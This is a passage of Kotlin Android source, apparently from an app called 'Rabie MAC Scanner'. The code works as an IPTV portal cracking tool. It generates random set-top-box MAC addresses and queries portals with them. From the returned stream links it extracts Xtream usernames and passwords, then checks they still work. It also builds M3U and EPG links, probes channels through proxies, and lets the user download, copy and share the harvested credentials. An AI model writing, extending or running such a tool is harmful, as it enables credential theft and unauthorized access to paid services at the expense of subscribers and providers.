        if (link.isEmpty() && firstCid.isNotEmpty()) {
            try {
                val u3 = portal + ep + "?type=itv&action=create_link&cmd=" +
                    URLEncoder.encode("ffmpeg http://localhost/ch/" + firstCid + "_", "UTF-8") +
                    "&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
                val r3 = httpRetry(u3, hdr2(portal, mac, token), 8000)
                if (r3.code == 200) {
                    if (r3.body.contains("ffmpeg ")) {
                        link = r3.body.split("ffmpeg ")[1].split("\"")[0].replace("\\/", "/")
                    } else if (r3.body.contains("\"cmd\":\"")) {
                        link = r3.body.split("\"cmd\":\"")[1].split("\"")[0].replace("\\/", "/")
                    }
                }
            } catch (e: Exception) {
            }
        }
        if (link.isEmpty()) return null
        // ── v1.3: روابط play/live.php?mac=... تعني بوابة ماك-فقط — لا يوجد Xtream ──
        if (link.contains("mac=") || link.contains("/play/")) return null
        var user = ""
        var pass = ""
        var host = ""
        try {
            val noProto = link.substringAfter("://")
            host = noProto.substringBefore("/")
            var rest = noProto.substringAfter("/", "")
            if (rest.startsWith("live/")) rest = rest.substring(5)
            if (rest.startsWith("movie/")) rest = rest.substring(6)
            val parts = rest.split("/")
            if (parts.size >= 2) {
                user = parts[0]
                pass = parts[1]
            }
        } catch (e: Exception) {
        }
        if (user.isEmpty() || pass.isEmpty() || host.isEmpty()) return null
        // ── v1.3: تحقق أن اليوزر/الباس صحيحان فعلاً قبل إعطاء روابط ──
        try {
            val v = httpRetry("http://" + host + "/player_api.php?username=" +
                URLEncoder.encode(user, "UTF-8") + "&password=" + URLEncoder.encode(pass, "UTF-8"),
                mapOf("User-Agent" to UA), 8000)
            if (v.code != 200 || !v.body.contains("\"user_info\"") || v.body.contains("\"status\":\"Disabled\"")) return null
        } catch (e: Exception) {
            return null
        }
        val m3uPlus = "http://" + host + "/get.php?username=" + user + "&password=" + pass + "&type=m3u_plus"
        val m3u8 = m3uPlus + "&output=m3u8"
        val epg = "http://" + host + "/xmltv.php?username=" + user + "&password=" + pass + "&type=xml_plus"
        var vpn = ""
        if (firstCid.isNotEmpty()) {
            try {
                val u = "http://" + host + "/live/" + user + "/" + pass + "/" + firstCid + ".ts"
                val px = pickProxy()
                val conn = (if (px != null) URL(u).openConnection(px) else URL(u).openConnection()) as HttpURLConnection
                conn.connectTimeout = 8000
                conn.readTimeout = 8000
                conn.instanceFollowRedirects = false
                conn.setRequestProperty("User-Agent", "Lavf/57.83.100")
                conn.setRequestProperty("Icy-MetaData", "1")
                val code = conn.responseCode
                conn.disconnect()
                vpn = if (code == 302) "🔗 القناة: مفتوحة 🟢" else "🔗 القناة: مقفولة 🔴"
            } catch (e: Exception) {
                vpn = ""
            }
        }
        return M3uInfo(user, pass, host, m3uPlus, m3u8, epg, vpn)
    }

    // ── v1.2: إحصائيات السيرفر الكاملة (قنوات/أفلام/مسلسلات + تصنيفات) ──
    private fun serverInfo(host: String, user: String, pass: String): ServerInfo? {
        val h = mapOf("User-Agent" to UA)
        return try {
            val base = "http://" + host + "/player_api.php?username=" + user + "&password=" + pass + "&action="
            val liveB = httpRetry(base + "get_live_streams", h, 10000)
            val vodB = httpRetry(base + "get_vod_streams", h, 10000)
            val serB = httpRetry(base + "get_series", h, 10000)
            val live = if (liveB.code == 200) liveB.body.split("stream_id").size - 1 else 0
            val vod = if (vodB.code == 200) vodB.body.split("stream_id").size - 1 else 0
            val ser = if (serB.code == 200) serB.body.split("series_id").size - 1 else 0
            val catBase = "http://" + host + "/player_api.php?username=" + user + "&password=" + pass + "&action="
            val g1 = titles(httpRetry(catBase + "get_live_categories", h, 10000).body, 8)
            val g2 = titles(httpRetry(catBase + "get_vod_categories", h, 10000).body, 8)
            val g3 = titles(httpRetry(catBase + "get_series_categories", h, 10000).body, 8)
            ServerInfo(live, vod, ser,
                "🎬 قنوات: " + g1 + "\n🎞 أفلام: " + g2 + "\n📺 مسلسلات: " + g3)
        } catch (e: Exception) {
            null
        }
    }

    // ── v1.2: تحميل ملف M3U إلى مجلد التنزيلات ──
    private fun downloadM3u(url: String, mac: String) {
        try {
            val dm = getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
            val req = DownloadManager.Request(Uri.parse(url))
            req.setTitle("M3U " + mac)
            req.setDescription("Rabie MAC Scanner")
            req.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
            req.setDestinationInExternalPublicDir(android.os.Environment.DIRECTORY_DOWNLOADS,
                "m3u_" + mac.replace(":", "-") + ".m3u")
            dm.enqueue(req)
            toast("⬇️ التحميل بدأ — تلقاه في مجلد التنزيلات")
        } catch (e: Exception) {
            toast("فشل بدء التحميل: " + (e.message ?: ""))
        }
    }

    private fun copyLinks(item: HitItem) {
        val sb = StringBuilder()
        sb.append("M3U: ").append(item.m3uPlus).append("\n")
        sb.append("M3U8: ").append(item.m3u8).append("\n")
        sb.append("EPG: ").append(item.epg).append("\n")
        sb.append("User: ").append(item.user).append(" | Pass: ").append(item.pass).append(" | Host: ").append(item.realHost)
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        cm.setPrimaryClip(android.content.ClipData.newPlainText("m3u", sb.toString()))
        toast("📋 الروابط في الحافظة")
    }

    // ── v1.2: توليد ماكات عشوائية (للبوابات الخاصة بك) ──
    private fun genMacs() {
        val n0 = etGenCount.text?.toString()?.trim()?.toIntOrNull() ?: 20
        val n = if (n0 < 1) 20 else if (n0 > 500) 500 else n0
        val sb = StringBuilder()
        val r = java.util.Random()
        for (i in 1..n) {
            sb.append(String.format("00:1A:79:%02X:%02X:%02X", r.nextInt(256), r.nextInt(256), r.nextInt(256)))
            if (i < n) sb.append("\n")
        }
        etPaste.setText(sb.toString())
        etPaste.visibility = View.VISIBLE
        tvMacsInfo.text = "🎲 ولّدت " + n + " ماك عشوائي — ابدأ الفحص"
    }

    private fun parseExp(v: Any?): Long? {
        if (v == null) return null
        if (v is Number) {
            val d = v.toDouble()
            if (d <= 0) return null
            var sec = d.toLong()
            if (d > 1e12) sec = (d / 1000.0).toLong()
            return sec * 1000L
        }
        val s = v.toString().trim()
        if (s.isEmpty() || s == "0000-00-00 00:00:00") return null
        val fmts = arrayOf("yyyy-MM-dd HH:mm:ss", "yyyy-MM-dd")
        for (f in fmts) {
            try {
                val p = SimpleDateFormat(f, Locale.US)
                p.isLenient = false
                val t = p.parse(s)
                if (t != null) return t.time
            } catch (e: Exception) {
            }
        }
        return null
    }

    private fun calcRemaining(expMs: Long): String {
        val diff = expMs - System.currentTimeMillis()
        if (diff < 0) return "Expired"
        if (diff < 86400000L) return "< 1 Day"
        return (diff / 86400000L).toString() + " Days"
    }

    // ═══════════ السجل ═══════════
    private fun addLog(line: String) {
        synchronized(logLock) {
            logLines.add(line)
            if (logLines.size > 220) {
                while (logLines.size > 120) logLines.removeAt(0)
            }
        }
        handler.post {
            val sb = StringBuilder()
            synchronized(logLock) {
                for (l in logLines) sb.append(l).append("\n")
            }
            tvLog.text = sb.toString()
            svLog.post { svLog.fullScroll(View.FOCUS_DOWN) }
        }
    }

    private fun addReason(mac: String, stage: String, err: String?) {
        val n = printedReasons.incrementAndGet()
        if (n <= 20) addLog("[i] " + mac + " → " + stage + ": " + (err ?: "error"))
    }

    // ═══════════ النهاية: التلخيص والنتائج ═══════════
    private fun finishRun() {
        if (!running.get() && cProcessed.get() == 0L) return
        running.set(false)
        handler.removeCallbacks(uiTick)
        val dur = System.currentTimeMillis() - startTime
        tvSummary.text = buildSummary(dur)
        populateHits()
        showScreen(3)
        val f = hitsFileObj
        val path = if (f != null) f.absolutePath else "غير متوفر"
        tvLastRun.text = "آخر نتائج محفوظة: " + path + " — " + hits.size + " نتيجة"
    }

    private fun fmtDuration(ms: Long): String {
        val s = ms / 1000
        if (s < 60) return s.toString() + "s"
        return (s / 60).toString() + "m " + (s % 60) + "s"
    }

    private fun buildSummary(dur: Long): String {
        val sb = StringBuilder()
        sb.append("Duration   : ").append(fmtDuration(dur)).append("\n")
        sb.append("Valid      : ").append(totalValid).append("\n")
        sb.append("Invalid    : ").append(invalidCount).append("\n")
        sb.append("Processed  : ").append(cProcessed.get()).append("\n")
        sb.append("Hits       : ").append(cHits.get()).append("\n")
        sb.append("Blocked    : ").append(cBlocked.get()).append("\n")
        sb.append("Ghost      : ").append(cGhost.get()).append("\n")
        sb.append("Network    : ").append(cNet.get()).append("\n")
        sb.append("Auth Fail  : ").append(cAuth.get()).append("\n")
        sb.append("Struct Err : ").append(cStruct.get()).append("\n")
        sb.append("I/O Err    : ").append(cIO.get())
        sb.append("\nM3U Found  : ").append(cM3u.get())
        sb.append("\nExp-Filter : ").append(cExpFiltered.get())
        return sb.toString()
    }

    private fun dp(v: Int): Int {
        return (v * resources.displayMetrics.density).toInt()
    }

    private fun populateHits() {
        hitsList.removeAllViews()
        var count = 0
        synchronized(hitLock) {
            for (item in hitItems) {
                if (count >= 300) break
                addHitRow(item)
                count++
            }
        }
        if (count == 0) {
            val tv = TextView(this)
            tv.text = "لا توجد نتائج ناجحة في هذا الفحص"
            tv.setTextColor(0xFF7A869C.toInt())
            tv.textSize = 13f
            tv.gravity = 17
            tv.setPadding(dp(8), dp(14), dp(8), dp(14))
            hitsList.addView(tv)
        }
    }

    private fun addHitRow(item: HitItem) {
        val row = LinearLayout(this)
        row.orientation = LinearLayout.HORIZONTAL
        row.setBackgroundResource(R.drawable.d_hit)
        row.setPadding(dp(8), dp(8), dp(8), dp(8))
        val lp = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        lp.setMargins(0, dp(3), 0, dp(3))
        row.layoutParams = lp

        val tvDot = TextView(this)
        tvDot.text = item.dot
        tvDot.textSize = 16f
        row.addView(tvDot)

        val col = LinearLayout(this)
        col.orientation = LinearLayout.VERTICAL

        val tvMac = TextView(this)
        tvMac.text = item.mac
        tvMac.textSize = 13f
        tvMac.setTypeface(null, Typeface.BOLD)
        tvMac.setTextColor(0xFFC6D0E2.toInt())
        tvMac.textDirection = View.TEXT_DIRECTION_LTR
        col.addView(tvMac)

        val tvInfo = TextView(this)
        tvInfo.text = item.info
        tvInfo.textSize = 11f
        tvInfo.setTextColor(0xFF7A869C.toInt())
        col.addView(tvInfo)

        if (item.counts.isNotEmpty()) {
            val tvC = TextView(this)
            tvC.text = "📊 " + item.counts
            tvC.textSize = 11f
            tvC.setTextColor(0xFF3EC46D.toInt())
            col.addView(tvC)
        }
        if (item.genres.isNotEmpty()) {
            val tvG = TextView(this)
            tvG.text = item.genres
            tvG.textSize = 10f
            tvG.setTextColor(0xFF7A869C.toInt())
            col.addView(tvG)
        }
        if (item.vpn.isNotEmpty()) {
            val tvV = TextView(this)
            tvV.text = item.vpn
            tvV.textSize = 11f
            tvV.setTextColor(0xFFE6C15A.toInt())
            col.addView(tvV)
        }

        row.addView(col)

        if (item.m3uPlus.isNotEmpty()) {
            val btns = LinearLayout(this)
            btns.orientation = LinearLayout.VERTICAL
            val btnD = Button(this)
            btnD.text = "⬇️ M3U"
            btnD.textSize = 10f
            btnD.setPadding(dp(6), dp(2), dp(6), dp(2))
            btnD.setBackgroundResource(R.drawable.d_gold)
            btnD.setTextColor(0xFF06080F.toInt())
            btnD.setOnClickListener { downloadM3u(item.m3uPlus, item.mac) }
            btns.addView(btnD)
            val btnC = Button(this)
            btnC.text = "📋"
            btnC.textSize = 10f
            btnC.setPadding(dp(6), dp(2), dp(6), dp(2))
            btnC.setBackgroundResource(R.drawable.d_dark_btn)
            btnC.setTextColor(0xFFC6D0E2.toInt())
            btnC.setOnClickListener { copyLinks(item) }
            btns.addView(btnC)
            row.addView(btns)
        }

        hitsList.addView(row)
    }

    private fun shareResults() {
        val sb = StringBuilder()
        sb.append("Rabie MAC Scanner — النتائج\n")
        sb.append(tvSummary.text).append("\n\n")
        synchronized(hitLock) {
            if (hits.isEmpty()) sb.append("(لا توجد Hits)")
            for (h in hits) sb.append(h).append("\n")
        }
        try {
            val i = Intent(Intent.ACTION_SEND)
            i.type = "text/plain"
            i.putExtra(Intent.EXTRA_TEXT, sb.toString())
            startActivity(Intent.createChooser(i, "مشاركة النتائج"))
        } catch (e: Exception) {
            toast("فشل المشاركة")
        }
    }
}
